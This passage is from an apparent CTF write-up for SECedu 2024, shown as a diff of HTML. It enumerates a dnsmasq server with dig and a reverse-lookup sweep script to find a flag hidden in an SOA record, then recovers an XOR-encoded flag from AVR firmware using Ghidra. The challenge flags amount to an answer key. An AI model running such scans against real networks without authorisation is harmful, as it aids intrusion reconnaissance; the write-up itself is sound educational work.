+<td class="rouge-code"><pre>S
+SE
+...
+SECEDU{4_P1P_4ND_4_8UZZ_4ND_4_5QU34KY_WH331}
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Flag: <mark>SECEDU{4_P1P_4ND_4_8UZZ_4ND_4_5QU34KY_WH331}</mark></p>
+
+<h3 id="the-names-bossed-m-bossed">
+<span class="me-2">The name’s Bossed, M. Bossed!</span><a href="#the-names-bossed-m-bossed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>Whilst scanning the network we found an unknown service running on port 4953. What could it be?</p>
+</blockquote>
+
+<p>Using the same domain as earlier <code class="language-plaintext highlighter-rouge">chals.secedu.site</code>, I run an <code class="language-plaintext highlighter-rouge">nmap</code> scan on port <code class="language-plaintext highlighter-rouge">4953</code>. Taking a guess I notice the <code class="language-plaintext highlighter-rouge">53</code> and presume its related to DNS, as port <code class="language-plaintext highlighter-rouge">53</code> is used for DNS.</p>
+
+<p>Note: I seemed to have noticed some inconsistency in <code class="language-plaintext highlighter-rouge">nmap</code>’s results for figuring out what service this is, sometimes getting something <code class="language-plaintext highlighter-rouge">db</code> related.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td>
+<td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
+4953/tcp open  domain  dnsmasq 2.68
+| dns-nsid:
+|_  bind.version: dnsmasq-2.68
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Starting with a usage of <code class="language-plaintext highlighter-rouge">chaos</code> which can return metadata about the DNS server, we can see the version like how <code class="language-plaintext highlighter-rouge">nmap</code> has.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>dig @chals.secedu.site <span class="nt">-p</span> 4953 chaos txt version.bind +short
+<span class="s2">"dnsmasq-2.68"</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>I then look into <code class="language-plaintext highlighter-rouge">chals.secedu.site</code> as thats the subdomain we are on:</p>
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>dig @chals.secedu.site <span class="nt">-p</span> 4953 chals.secedu.site +short
+172.31.0.25
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>An <code class="language-plaintext highlighter-rouge">A</code> record is interesting, I then do a reverse lookup of the IP below that one: <code class="language-plaintext highlighter-rouge">172.31.0.24</code>.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>dig @chals.secedu.site <span class="nt">-p</span> 4953 <span class="nt">-x</span> 172.31.0.24 +short      
+x-ray.secedu.site.
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Interesting!</p>
+
+<p>I make a script to map out the subdomains:</p>
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td>
+<td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nv">server</span><span class="o">=</span><span class="s2">"chals.secedu.site"</span>
+<span class="nv">port</span><span class="o">=</span><span class="s2">"4953"</span>
+<span class="nv">base_ip</span><span class="o">=</span><span class="s2">"172.31.0."</span>
+<span class="nv">start</span><span class="o">=</span>1
+<span class="nv">end</span><span class="o">=</span>256
+
+<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq</span> <span class="nv">$start</span> <span class="nv">$end</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+</span><span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">base_ip</span><span class="k">}${</span><span class="nv">i</span><span class="k">}</span><span class="s2">"</span>
+<span class="nv">reverse_name</span><span class="o">=</span><span class="si">$(</span>dig +short <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$ip_address</span><span class="s2">"</span> @<span class="s2">"</span><span class="nv">$server</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$port</span><span class="s2">"</span><span class="si">)</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$reverse_name</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$ip_address</span><span class="s2"> -&gt; </span><span class="nv">$reverse_name</span><span class="s2">"</span>
+<span class="k">else
+    </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$ip_address</span><span class="s2"> -&gt; No PTR record found"</span>
+<span class="k">fi
+done</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>This outputs:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td>
+<td class="rouge-code"><pre>172.31.0.1 -&gt; alfa.secedu.site.
+172.31.0.2 -&gt; bravo.secedu.site.
+172.31.0.3 -&gt; charlie.secedu.site.
+172.31.0.4 -&gt; delta.secedu.site.
+172.31.0.5 -&gt; echo.secedu.site.
+172.31.0.6 -&gt; foxtrot.secedu.site.
+172.31.0.7 -&gt; golf.secedu.site.
+172.31.0.8 -&gt; hotel.secedu.site.
+172.31.0.9 -&gt; india.secedu.site.
+172.31.0.10 -&gt; juliett.secedu.site.
+172.31.0.11 -&gt; kilo.secedu.site.
+172.31.0.12 -&gt; lima.secedu.site.
+172.31.0.13 -&gt; mike.secedu.site.
+172.31.0.14 -&gt; november.secedu.site.
+172.31.0.15 -&gt; oscar.secedu.site.
+172.31.0.16 -&gt; papa.secedu.site.
+172.31.0.17 -&gt; quebec.secedu.site.
+172.31.0.18 -&gt; romeo.secedu.site.
+172.31.0.19 -&gt; sierra.secedu.site.
+172.31.0.20 -&gt; tango.secedu.site.
+172.31.0.21 -&gt; uniform.secedu.site.
+172.31.0.22 -&gt; victor.secedu.site.
+172.31.0.23 -&gt; whiskey.secedu.site.
+172.31.0.24 -&gt; x-ray.secedu.site.
+172.31.0.25 -&gt; chals.secedu.site.
+172.31.0.26 -&gt; hydrogen.secedu.site.
+172.31.0.27 -&gt; helium.secedu.site.
+172.31.0.28 -&gt; lithium.secedu.site.
+172.31.0.29 -&gt; beryllium.secedu.site.
+172.31.0.30 -&gt; boron.secedu.site.
+...
+172.31.0.135 -&gt; darmstadtium.secedu.site.
+172.31.0.136 -&gt; roentgenium.secedu.site.
+172.31.0.137 -&gt; copernicium.secedu.site.
+172.31.0.138 -&gt; nihonium.secedu.site.
+172.31.0.139 -&gt; flerovium.secedu.site.
+172.31.0.140 -&gt; moscovium.secedu.site.
+172.31.0.141 -&gt; livermorium.secedu.site.
+172.31.0.142 -&gt; tennessine.secedu.site.
+172.31.0.143 -&gt; oganesson.secedu.site.
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We see that the subdomains for <code class="language-plaintext highlighter-rouge">y</code> and <code class="language-plaintext highlighter-rouge">z</code> in the phonetic alphabet are missing, and we instead see the <code class="language-plaintext highlighter-rouge">chals</code> subdomain, then all the elements from 1-118.</p>
+
+<p>Lots of enumeration, searching for non-existent subs for names like <code class="language-plaintext highlighter-rouge">yankee</code> or <code class="language-plaintext highlighter-rouge">zulu</code> giving nothing, as well as scanning for all the record types under those subs we find nothing…</p>
+
+<p>My teammate suggests we look for records under the original <code class="language-plaintext highlighter-rouge">secedu.site</code> domain.</p>
+
+<p>We <em>eventually</em> got a hit on a <code class="language-plaintext highlighter-rouge">SOA</code> record:</p>
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>dig @chals.secedu.site <span class="nt">-p</span> 4953 SOA secedu.site +short +time<span class="o">=</span>1  
+<span class="p">;;</span> Got bad packet: bad label <span class="nb">type
+</span>185 bytes
+2b 63 85 a0 00 01 00 01 00 02 00 00 06 73 65 63          +c...........sec
+65 64 75 04 73 69 74 65 00 00 06 00 01 06 73 65          edu.site......se
+63 65 64 75 04 73 69 74 65 00 00 06 00 01 00 00          cedu.site.......
+02 58 00 5f 00 48 53 45 43 45 44 55 7b 34 71 43          .X._.HSECEDU<span class="o">{</span>4qC
+5a 34 71 43 64 34 71 43 4f 34 71 43 34 34 71 43          Z4qCd4qCO4qC44qC
+66 34 71 43 6c 34 71 43 52 34 71 43 69 34 71 43          f4qCl4qCR4qCi4qC
+65 34 71 43 34 34 71 43 4f 34 71 43 56 34 71 43          e4qC44qCO4qCV4qC
+48 34 71 43 6e 34 71 43 52 34 71 43 5a 7d 00 00          H4qCn4qCR4qCZ<span class="o">}</span>..
+00 00 2a 00 00 04 b0 00 00 00 b4 00 12 75 00 00          ..<span class="k">*</span>..........u..
+00 02 58 c0 1d 00 02 00 01 00 00 02 58 00 01 00          ..X.........X...
+c0 1d 00 02 00 01 00 00 02 58 00 0d 06 73 65 63          .........X...sec
+65 64 75 04 73 69 74 65 00                               edu.site.
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Flag! Quickly submit it!</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-incorrect.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-incorrect.png" alt="boss-incorrect.png" loading="lazy"></a></p>
+
+<p>Well, seems we have more work to do. That string looks weird come to think of it!</p>
+
+<p>Putting the string into Cyberchef its identified as Base64, decoding to some unicode: <code class="language-plaintext highlighter-rouge">⠙⠝⠎⠸⠟⠥⠑⠢⠞⠸⠎⠕⠇⠧⠑⠙</code>.</p>
+
+<p>This is Braille! (That explains the M. Bossed name, Embossed, very funny…)</p>
+
+<p>I used <a href="https://www.brailletranslator.org/">brailletranslator.org</a> to decode it to the flag.</p>
+
+<p>Flag: <mark>SECEDU{dns_que5t_solved}</mark></p>
+
+<h2 id="insane">
+<span class="me-2">Insane</span><a href="#insane" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h2>
+
+<h3 id="medium-ware">
+<span class="me-2">Medium-ware</span><a href="#medium-ware" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>We’ve managed to dump some firmware from an experimental AVR8-driven PLC. Our developer had hardcoded a particular string inside, and promises that it’s “secure enough”.</p>
+</blockquote>
+
+<blockquote>
+  <p>Find a way to extract this string. This is the flag in its entirety.</p>
+</blockquote>
+
+<blockquote>
+  <p>This is expected to be quite a difficult challenge for week 1.</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: Look for references to DAT_mem, revealing the location hiding with offset 0x02d2. This will also yield a xor operation, 0x97, that is used to decode a string at the end of the code segment.</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: There is some rubbish data following a predicatable pattern once the xor key is applied.</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: There is random data inside the flag. i.e: <code class="language-plaintext highlighter-rouge">SECEDU{&lt;front&gt;_&lt;random_data&gt;}</code> This is intentional, keep going until you find a closed bracket <code class="language-plaintext highlighter-rouge">}</code>.</p>
+</blockquote>
+
+<p>This challenge was the most <em>brutal</em> one for the week, a PLC based challenge (which I have next to no experience in, apart from <a href="./scones2024">SCONES 2024</a> which had the same author as the hardware challenges there for this challenge).</p>
+
+<p>From previous experience with these kinds of challenges, and some searching, we start with the <code class="language-plaintext highlighter-rouge">firmware.hex</code> with Ghidra.</p>
+
+<p>I start by making a project, the usual Ghidra setup, then I import the file.</p>
+
+<p>I search ‘AVR’ as indicated in the challenge prompt, and look at the available languages:</p>
+
+<p><a href="/images/ctfs/secedu2024/mediumwave-langs.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/mediumwave-langs.png" alt="mediumwave-langs.png" loading="lazy"></a></p>
+
+<p>I select <code class="language-plaintext highlighter-rouge">AVR8</code> and select the size <code class="language-plaintext highlighter-rouge">16 GCC</code> version, as I did in my <a href="./scones2024">SCONES 2024</a> writeup.</p>
+
+<p>I open it up in the CodeBrowser, and for analysis select my options.</p>
+
+<p>I <code class="language-plaintext highlighter-rouge">Select All</code> options, <code class="language-plaintext highlighter-rouge">Apply</code>, then <code class="language-plaintext highlighter-rouge">Analyze</code>.</p>
+
+<p>Once that’s complete, we know we are looking for a hardcoded secret, the hints suggest looking at the <code class="language-plaintext highlighter-rouge">0x02d2</code> offset to start.</p>
+
+<p>We can see a faily trivial looking function:</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td>
+<td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">FUN_code_027b</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="k">do</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Do nothing block with infinite loop */</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>but below is what looks like an interesting string:</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-what.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-what.png" alt="boss-what.png" loading="lazy"></a></p>
+
+<p>I then do a <code class="language-plaintext highlighter-rouge">Search</code> &gt; <code class="language-plaintext highlighter-rouge">For Encoded Strings...</code>.</p>
+
+<p>Some are filtered so I disable the <code class="language-plaintext highlighter-rouge">Exclude codec errors</code> filter in <code class="language-plaintext highlighter-rouge">Advanced...</code></p>
+
+<p>There’s only one, at the <code class="language-plaintext highlighter-rouge">0x027d</code> as suggested in the string, this seems interesting!</p>
+
+<p>I press <code class="language-plaintext highlighter-rouge">Create All</code> to create the strings.</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-encoded.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-encoded.png" alt="boss-encoded.png" loading="lazy"></a></p>
+
+<p>If you copy the ‘Encoded String’ its missing a C3 at the start</p>
+
+<p><a href="/images/ctfs/secedu2024/mediumwave-byte.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/mediumwave-byte.png" alt="mediumwave-byte.png" loading="lazy"></a></p>
+
+<p>I copy the full string and manually add the <code class="language-plaintext highlighter-rouge">C3h,</code> to the start:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>C3h,84h,C3h,A3h,C3h,9Bh,C3h,92h,C3h,82h,C3h,85h,C3h,94h,C3h,84h,C3h,B2h,C3h,92h,C3h,A3h,C3h,92h,C3h,93h,C3h,B2h,C3h,85h,C3h,82h,C3h,95h,C3h,B3h,C3h,ACh,C3h,A3h,C3h,BDh,C3h,B0h,C2h,A2h,C3h,86h,C2h,A4h,C3h,AEh,C2h,AAh,C3h,A3h,C3h,99h,C3h,96h,C3h,88h,C3h,81h,C3h,BCh,C3h,A5h,C3h,94h,C3h,9Bh,C2h,A4h,C3h,80h,C3h,92h,C3h,A1h,C2h,BCh,C2h,A7h,C2h,B0h,C3h,80h,C3h,BCh,C3h,B3h,C3h,82h,C3h,A5h,C3h,88h,C3h,B9h,C3h,A0h,C2h,AEh,C2h,B8h,C3h,A5h,C3h,B1h,C3h,8Dh,C2h,AEh,C2h,A7h,C3h,BEh,C3h,91h,C3h,B6h,C3h,96h,C3h,80h,C2h,A6h,C2h,B8h,C3h,A3h,C3h,B6h,C3h,99h,C3h,99h,C2h,A4h,C3h,A7h,C3h,9Bh,C2h,A0h,C3h,99h,C2h,B8h,C2h,A2h,C3h,A0h,C3h,8Fh,C2h,A1h,C3h,B9h,C3h,B1h,C2h,A2h,C3h,B3h,C2h,B8h,C2h,A4h,C3h,85h,C3h,80h,C2h,A0h,C3h,93h,C3h,99h,C2h,AEh,C2h,AAh,C3h,A3h,C2h,AFh,C3h,93h,C3h,9Bh,C3h,B4h,C2h,AAh,C3h,86h,C3h,AAh,C3h,9Bh,C3h,99h
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We know an XOR is being used from the hint, so I look up the <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/AVR-Instruction-Set-Manual-DS40002198A.pdf">manual</a> for the AVR8’s.</p>
+
+<p>Looking for the XOR symbol, I find th <code class="language-plaintext highlighter-rouge">EOR</code> operation.</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-eor.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-eor.png" alt="boss-eor.png" loading="lazy"></a></p>
+
+<p>I then search the Program Text for any instances of <code class="language-plaintext highlighter-rouge">eor</code>.</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-eor-lookup.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-eor-lookup.png" alt="boss-eor-lookup.png" loading="lazy"></a></p>
+
+<p>The last result has the <code class="language-plaintext highlighter-rouge">XOR</code> with <code class="language-plaintext highlighter-rouge">0x61</code>, which is <code class="language-plaintext highlighter-rouge">97</code> as we expect in the hint.</p>
+
+<p>This is the code snippet of interest:</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td>
+<td class="rouge-code"><pre><span class="n">X</span> <span class="o">=</span> <span class="n">R13R12</span><span class="p">;</span>
+<span class="n">R15R14</span><span class="p">.</span><span class="n">_1_1_</span> <span class="o">=</span> <span class="o">*</span><span class="n">R13R12</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">R15R14</span><span class="p">.</span><span class="n">_1_1_</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+<span class="n">R25R24</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">FUN_code_00f5</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">R25R24</span><span class="p">,</span><span class="n">R23R22</span><span class="p">,</span><span class="n">R21R20</span><span class="p">,</span><span class="n">R19R18</span><span class="p">);</span>
+<span class="n">R25R24</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">CONCAT11</span><span class="p">(</span><span class="n">R25R24</span><span class="p">.</span><span class="n">_1_1_</span><span class="p">,</span><span class="n">R15R14</span><span class="p">.</span><span class="n">_1_1_</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x61</span><span class="p">);</span>
+<span class="n">R17R16</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_mem_85c7</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="n">R13R12</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">CONCAT11</span><span class="p">(</span><span class="n">R13R12</span><span class="p">.</span><span class="n">_1_1_</span> <span class="o">+</span> <span class="n">R1R0</span><span class="p">.</span><span class="n">_1_1_</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xfc</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">R13R12</span><span class="p">),</span>
+                    <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">R13R12</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);;</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>It is doing the XOR operation we expect, then adding 3 each time, so only selecting the 0th, 3rd, 6th, etc characters.</p>
+
+<p>I then make a <a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'h'%7D,'',true,false,true,false)From_Hex('Auto')Decode_text('UTF-8%20(65001)')XOR(%7B'option':'Hex','string':'97'%7D,'Standard',false)Find_/_Replace(%7B'option':'Regex','string':'(.)(?:.%7B2%7D)'%7D,'$1',true,false,false,false)&amp;input=QzNoLDg0aCxDM2gsQTNoLEMzaCw5QmgsQzNoLDkyaCxDM2gsODJoLEMzaCw4NWgsQzNoLDk0aCxDM2gsODRoLEMzaCxCMmgsQzNoLDkyaCxDM2gsQTNoLEMzaCw5MmgsQzNoLDkzaCxDM2gsQjJoLEMzaCw4NWgsQzNoLDgyaCxDM2gsOTVoLEMzaCxCM2gsQzNoLEFDaCxDM2gsQTNoLEMzaCxCRGgsQzNoLEIwaCxDMmgsQTJoLEMzaCw4NmgsQzJoLEE0aCxDM2gsQUVoLEMyaCxBQWgsQzNoLEEzaCxDM2gsOTloLEMzaCw5NmgsQzNoLDg4aCxDM2gsODFoLEMzaCxCQ2gsQzNoLEE1aCxDM2gsOTRoLEMzaCw5QmgsQzJoLEE0aCxDM2gsODBoLEMzaCw5MmgsQzNoLEExaCxDMmgsQkNoLEMyaCxBN2gsQzJoLEIwaCxDM2gsODBoLEMzaCxCQ2gsQzNoLEIzaCxDM2gsODJoLEMzaCxBNWgsQzNoLDg4aCxDM2gsQjloLEMzaCxBMGgsQzJoLEFFaCxDMmgsQjhoLEMzaCxBNWgsQzNoLEIxaCxDM2gsOERoLEMyaCxBRWgsQzJoLEE3aCxDM2gsQkVoLEMzaCw5MWgsQzNoLEI2aCxDM2gsOTZoLEMzaCw4MGgsQzJoLEE2aCxDMmgsQjhoLEMzaCxBM2gsQzNoLEI2aCxDM2gsOTloLEMzaCw5OWgsQzJoLEE0aCxDM2gsQTdoLEMzaCw5QmgsQzJoLEEwaCxDM2gsOTloLEMyaCxCOGgsQzJoLEEyaCxDM2gsQTBoLEMzaCw4RmgsQzJoLEExaCxDM2gsQjloLEMzaCxCMWgsQzJoLEEyaCxDM2gsQjNoLEMyaCxCOGgsQzJoLEE0aCxDM2gsODVoLEMzaCw4MGgsQzJoLEEwaCxDM2gsOTNoLEMzaCw5OWgsQzJoLEFFaCxDMmgsQUFoLEMzaCxBM2gsQzJoLEFGaCxDM2gsOTNoLEMzaCw5QmgsQzNoLEI0aCxDMmgsQUFoLEMzaCw4NmgsQzNoLEFBaCxDM2gsOUJoLEMzaCw5OWg&amp;oeol=NEL">CyberChef recipe</a> to do the whole process.</p>
+
+<p>The issue we had was noticing the <code class="language-plaintext highlighter-rouge">UTF-8</code> as in Cyberchef, the output automaticallly visually adjusts to detected decoding, but works with the raw output.</p>
+
+<p>Flag: <mark>SECEDU{g3t_r3v'd_9f0a1a375653798c}</mark></p>
+
+<p>During the challenge we were also provided some other files that were mostly red herrings, but helped with figuring out the XOR and every 3rd character functions.</p>
+
+<p>Inside a given <code class="language-plaintext highlighter-rouge">PLC.ino.lst</code> file, there is some information about a ‘secret code’.</p>
+
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">blinkSecretCode</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">portData</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">blankLEDs</span><span class="p">();</span>
+    <span class="n">blinkLEDsOnPattern</span><span class="p">(</span><span class="n">portData</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="mi">97</span><span class="p">);</span>
+ <span class="mi">410</span><span class="o">:</span>	<span class="mi">41</span> <span class="n">e6</span>       	<span class="n">ldi</span>	<span class="n">r20</span><span class="p">,</span> <span class="mh">0x61</span>	<span class="p">;</span> <span class="mi">97</span>
+ <span class="mi">412</span><span class="o">:</span>	<span class="n">b4</span> <span class="mi">2</span><span class="n">e</span>       	<span class="n">mov</span>	<span class="n">r11</span><span class="p">,</span> <span class="n">r20</span>
+<span class="p">}</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>There we can see that <code class="language-plaintext highlighter-rouge">97</code> hex for the XOR, and its iterating <code class="language-plaintext highlighter-rouge">i</code> by <code class="language-plaintext highlighter-rouge">3</code>.</p>
+
+<p>Inside the <code class="language-plaintext highlighter-rouge">PLC.ino.map</code> we can see <code class="language-plaintext highlighter-rouge">portData</code> is located at <code class="language-plaintext highlighter-rouge">84fa</code>:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>portData            |000084fa|   r  |            OBJECT|000000cd|     |.rodata	/home/tom/Desktop/chal/PLC/PLC.ino:10
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We can see in Ghidra the <code class="language-plaintext highlighter-rouge">DAT_mem_84fa</code>:</p>
+
+<p><a href="/images/ctfs/secedu2024/boss-84fa.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/boss-84fa.png" alt="boss-84fa.png" loading="lazy"></a></p>
+
+<p>This helps us see where the data is loaded in the decompiled Ghidra code, which helped us with reverse engineering during the first week, this writeup was adjusted to just use the <code class="language-plaintext highlighter-rouge">firmware.hex</code> as its possible to solve it with that.</p>
+
+<h2 id="thanks-for-reading">
+<span class="me-2">Thanks for reading!</span><a href="#thanks-for-reading" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h2>
+<p>Big thank you to all the people at SECedu making this event possible, can’t wait for next week!</p>
+
+<p>Feel free to give me feedback or follow me on <a href="https://twitter.com/sealldev">Twitter</a> and <a href="https://www.linkedin.com/in/noah-cooper-5442ab309/">LinkedIn</a>.</p>
+
+<p>You can also find my other contacts on the <a href="../about">whoami</a> page.</p>
+
+  
